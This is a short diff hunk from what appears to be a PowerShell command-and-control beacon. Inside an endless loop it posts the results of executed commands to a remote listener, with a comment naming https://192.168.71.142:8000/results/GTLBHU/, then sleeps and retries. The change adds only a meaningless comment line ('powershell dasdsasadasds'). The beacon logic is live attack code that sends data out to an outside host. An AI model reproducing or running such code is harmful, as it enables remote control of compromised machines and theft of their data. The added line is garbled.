@@ -139,7 +139,7 @@ for (;;){
         $data = @{result = "$result"}
 
         Invoke-WebRequest -UseBasicParsing -Uri $resultl -Body $data -Method 'POST' # --> https://192.168.71.142:8000/results/GTLBHU/
-
+#####powershell dasdsasadasds | 
     }
     Start-Sleep -Seconds $n
     }catch [System.Net.WebException] {
